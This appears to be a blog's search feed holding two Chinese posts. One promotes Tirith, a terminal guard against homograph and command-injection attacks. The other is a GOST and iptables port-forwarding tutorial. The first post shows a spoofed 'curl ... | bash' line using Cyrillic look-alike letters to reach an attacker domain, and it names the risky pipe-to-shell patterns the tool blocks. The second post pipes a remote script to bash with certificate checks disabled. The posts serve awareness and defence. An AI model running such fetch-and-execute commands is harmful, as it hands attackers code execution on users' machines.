<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</title>
    <link href="/2026/02/06/%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E5%AE%88%E6%8A%A4%E8%80%85Tirith/"/>
    <url>/2026/02/06/%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E5%AE%88%E6%8A%A4%E8%80%85Tirith/</url>
    
    <content type="html"><![CDATA[<h1 id="终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入"><a href="#终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入" class="headerlink" title="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入"></a>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</h1><p>作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 <code>curl</code> 指令，或者在 Stack Overflow 拷贝一行 <code>docker</code> 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？</p><p>今天，我想安利一个能救命的开源项目 —— **<a href="https://github.com/sheeki03/tirith">Tirith</a>**。</p><hr><h2 id="😱-致命的“像素级”骗局"><a href="#😱-致命的“像素级”骗局" class="headerlink" title="😱 致命的“像素级”骗局"></a>😱 致命的“像素级”骗局</h2><p>请睁大眼睛，看看下面这两行代码有什么不同？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Line A (Safe)</span><br>curl -sSL https://install.example-cli.dev | bash <br><br><span class="hljs-comment"># Line B (Compromised)</span><br>curl -sSL https://іnstall.example-clі.dev | bash<br></code></pre></td></tr></table></figure><p><strong>答案是：</strong> 没有任何区别。至少对你的肉眼和默认终端配置来说是这样的。</p><p><strong>但真相是：</strong> Line B 中的字母 <code>і</code> 并不是英语字母，而是 **西里尔字母 (U+0456)**。它会引导你的 <code>curl</code> 请求访问一个完全由攻击者控制的伪造域名。</p><p>如果你按下回车，你执行的不再是安装脚本，而是攻击者的恶意 Payload。浏览器在几年前就解决了这个问题，但<strong>我们的终端（Terminal）至今依然是“不设防”的。</strong></p><hr><h2 id="🛡️-Tirith：终端世界的“米纳斯提里斯”"><a href="#🛡️-Tirith：终端世界的“米纳斯提里斯”" class="headerlink" title="🛡️ Tirith：终端世界的“米纳斯提里斯”"></a>🛡️ Tirith：终端世界的“米纳斯提里斯”</h2><p>Tirith 取名自《指环王》中的刚铎都城，意为“守护者”。它是一个极轻量、零延迟的命令行安全网关，旨在通过自动化扫描拦截这些肉眼不可见的危险。</p><h3 id="🚀-它的核心能力："><a href="#🚀-它的核心能力：" class="headerlink" title="🚀 它的核心能力："></a>🚀 它的核心能力：</h3><ol><li><p><strong>同形攻击防御 (Homograph Defense)</strong><br>自动检测指令中包含的非 ASCII 同形字符，一旦发现恶意混淆，立即在执行前强行拦截。</p></li><li><p><strong>ANSI 转义注入防护</strong><br>防止恶意代码利用 ANSI 转义序列清空终端显示或篡改执行结果。</p></li><li><p><strong>管道指令安全预警</strong><br>针对 <code>curl | bash</code> 或 <code>wget | sh</code> 这种“危险模式”，Tirith 会强制弹出 Warning，要求你二次确认。</p></li><li><p><strong>关键配置文件锁定</strong><br>任何试图修改 <code>~/.ssh/authorized_keys</code>、<code>~/.bashrc</code> 或 <code>~/.gitconfig</code> 的可疑行为，都会被 Tirith 锁定并阻断。</p></li></ol><hr><h2 id="🔥-深度体验：为什么它是装机必备？"><a href="#🔥-深度体验：为什么它是装机必备？" class="headerlink" title="🔥 深度体验：为什么它是装机必备？"></a>🔥 深度体验：为什么它是装机必备？</h2><ul><li><strong>性能近乎原生</strong>：基于 Rust 的极简设计，扫描耗时通常小于 1 毫秒，你完全感受不到性能损耗。</li><li><strong>完全本地化</strong>：零数据外泄！所有分析都在你本地机器上完成，不需要任何 API Key。</li><li><strong>全平台兼容</strong>：完美支持 <code>zsh</code>, <code>bash</code>, <code>fish</code> 以及 Windows 上的 <code>PowerShell</code>。</li></ul><hr><h2 id="🛠️-三秒开启“神装”模式"><a href="#🛠️-三秒开启“神装”模式" class="headerlink" title="🛠️ 三秒开启“神装”模式"></a>🛠️ 三秒开启“神装”模式</h2><p><strong>使用 npm 一键安装：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure><p><strong>macOS 玩家专属：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install sheeki03/tap/tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="💡-结语"><a href="#💡-结语" class="headerlink" title="💡 结语"></a>💡 结语</h2><p>在这个“代码一把梭”的时代，多一份防范就少一分灾难。<strong>Tirith 不是在限制你的自由，它是在你打算“赛博自杀”的时候，帮你拉了一把。</strong></p><p>强烈建议每一位拥有生产服务器或重度依赖终端的同学装上它。</p><hr><blockquote><p>转载请注明出处：<a href="https://boaom.github.io/">boaom.github.io</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令行</tag>
      
      <tag>Tirith</tag>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用GOST搭建一个简单的端口转发</title>
    <link href="/2022/11/06/%E4%BD%BF%E7%94%A8GOST%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/11/06/%E4%BD%BF%E7%94%A8GOST%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>Gost</strong>是一个功能多样且实用的安全隧道工具，使用的是<strong>go</strong>语言编写<br><strong>GitHub项目：</strong><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a><br><strong>Gost文档：</strong><a href="https://docs.ginuerzh.xyz/gost">https://docs.ginuerzh.xyz/gost</a><br><strong>Gost搭建Socks5：</strong><a href="https://sunpma.com/862.html">https://sunpma.com/862.html</a></p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>多端口监听</li><li>可设置转发代理，支持多级转发(代理链)</li><li>支持标准HTTP&#x2F;HTTPS&#x2F;HTTP2&#x2F;SOCKS4(A)&#x2F;SOCKS5代理协议</li><li>Web代理支持探测防御</li><li>支持多种隧道类型</li><li>SOCKS5代理支持TLS协商加密</li><li>Tunnel UDP over TCP</li><li>TCP&#x2F;UDP透明代理</li><li>本地&#x2F;远程TCP&#x2F;UDP端口转发</li><li>支持Shadowsocks(TCP&#x2F;UDP)协议</li><li>支持SNI代理</li><li>权限控制</li><li>负载均衡</li><li>路由控制</li><li>DNS解析和代理</li><li>TUN&#x2F;TAP设备</li></ul><h2 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">X64<br>wget <span class="hljs-string">&quot;https://github.com/ginuerzh/gost/releases/download/v2.8.1/gost_2.8.1_linux_amd64.tar.gz&quot;</span><br><br>tar -zxvf gost_2.<span class="hljs-number">8.1</span>_linux_amd64.tar.gz<br><br>mv gost_2.<span class="hljs-number">8.1</span>_linux_amd64<span class="hljs-regexp">/gost /u</span>sr<span class="hljs-regexp">/bin/g</span>ost<br><br>chmod +x <span class="hljs-regexp">/usr/</span>bin/gost<br>复制代码<br></code></pre></td></tr></table></figure><p><code>ARM</code>（比如甲骨文<code>ARM</code>机型）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget <span class="hljs-string">&quot;https://github.com/ginuerzh/gost/releases/download/v2.8.1/gost_2.8.1_linux_arm.tar.gz&quot;</span><br><br>tar -zxvf gost_2.<span class="hljs-number">8.1</span>_linux_arm.tar.gz<br><br>mv gost_2.<span class="hljs-number">8.1</span>_linux_arm<span class="hljs-regexp">/gost /u</span>sr<span class="hljs-regexp">/bin/g</span>ost<br><br>chmod +x <span class="hljs-regexp">/usr/</span>bin/gost<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>TCP 转发</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">gost -L=tcp:<span class="hljs-regexp">//</span>:本地使用端口/远程服务IP:远程服务端口<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>UDP 转发</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">gost -L=udp:<span class="hljs-regexp">//</span>:本地使用端口/远程服务IP:远程服务端口<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>全协议转发（TCP+UDP）</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gost <span class="hljs-attribute">-L</span>=:本地使用端口/远程服务IP:远程服务端口<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>小飞机转发</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gost <span class="hljs-attribute">-L</span>=:本地使用端口 <span class="hljs-attribute">-F</span>=ss://加密方式:密码@远程服务IP:远程服务端口?nodelay=true<br>复制代码<br></code></pre></td></tr></table></figure><p>示例：使用A服务器的<code>8888</code>端口转发IP为<code>114.114.114.114</code>的B服务器的<code>9999</code>端口（TCP+UDP）<br><code>gost -L=:8888/114.114.114.114:9999</code><br>创建命令后我们就可以连接到A服务器的<code>8888</code>端口，从而使用B服务器的<code>9999</code>端口；<br>如果服务器使用了宝塔面板需要在面板安全设置中放行对应的端口；</p><p>如果测试后没有问题，就可以使用<code>nohup</code>命令将转发设置挂载到后台持续运行；<br><code>nohup</code>命令重启后会失效，开机后再次挂载即可重新使用；<br><strong>挂载后台</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nohup gost -L=:本地使用端口/远程服务IP:远程服务端口 &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>关闭挂载</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">kill -<span class="hljs-number">9</span> <span class="hljs-constructor">$(<span class="hljs-params">ps</span> <span class="hljs-params">aux</span> | <span class="hljs-params">grep</span> <span class="hljs-string">&quot;gost&quot;</span> | <span class="hljs-params">sed</span> &#x27;<span class="hljs-operator">/</span><span class="hljs-params">grep</span><span class="hljs-operator">/</span><span class="hljs-params">d</span>&#x27; | <span class="hljs-params">awk</span> &#x27;&#123;<span class="hljs-params">print</span> $2&#125;&#x27;)</span><br>复制代码<br></code></pre></td></tr></table></figure><h2 id="Windows安装"><a href="#Windows安装" class="headerlink" title="Windows安装"></a>Windows安装</h2><p>首先下载需要的<code>Windows</code>版本程序：<a href="https://github.com/ginuerzh/gost/releases">https://github.com/ginuerzh/gost/releases</a><br>压缩包解压后将得到的<code>exe</code>后缀文件移动到<code>C</code>盘根目录下<br>然后打开系统<code>CMD(命令提示符)</code>输入以下命令开始运行：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 切换到C盘根目录</span><br>cd /<br><br><span class="hljs-comment"># 开始转发</span><br>gost-windows-amd64.exe -L=tcp:<span class="hljs-regexp">//</span>:本地使用端口/远程服务IP:远程服务端口<br><br><span class="hljs-comment"># 其中gost-windows-amd64.exe为移动到C盘根目录下的程序名称，如有不同自行修改；</span><br>复制代码<br></code></pre></td></tr></table></figure><h2 id="iptables-一键脚本"><a href="#iptables-一键脚本" class="headerlink" title="iptables 一键脚本"></a>iptables 一键脚本</h2><p>如果不想使用GOST，也可以选择使用iptables来转发，这里推荐一个233大佬的端口转发一键脚本；<br><strong>安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -N --no-check-certificate https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/sunpma/</span>doubi<span class="hljs-regexp">/master/i</span>ptables-pf.sh &amp;&amp; chmod +x iptables-pf.sh &amp;&amp; bash iptables-pf.sh<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>管理</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">./iptables-pf.sh<br> iptables 端口转发一键管理脚本 [v1.1.1]<br>  <br><span class="hljs-bullet"> 0.</span> 升级脚本<br>————————————<br><span class="hljs-bullet"> 1.</span> 安装 iptables<br><span class="hljs-bullet"> 2.</span> 清空 iptables 端口转发<br>————————————<br><span class="hljs-bullet"> 3.</span> 查看 iptables 端口转发<br><span class="hljs-bullet"> 4.</span> 添加 iptables 端口转发<br><span class="hljs-bullet"> 5.</span> 删除 iptables 端口转发<br>————————————<br>注意：初次使用前请请务必执行 1. 安装 iptables(不仅仅是安装)<br><br> 请输入数字 [0-5]:<br>复制代码<br></code></pre></td></tr></table></figure><p><strong>添加转发时依次输入落地端IP、落地端口、本地端口、本地内网IP、转发类型；</strong><br><strong>注意：填写本机IP时是填写本地内网IP地址，而非外网IP地址，查看本地内网IP地址可以使用<code>ifconfig</code>命令；</strong><br><a href="https://sunpma.com/usr/uploads/2020/10/3120166323.png"><img src="https://s.imgkb.xyz/abcdocker/2022/11/06/29204226b4b64/29204226b4b64.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
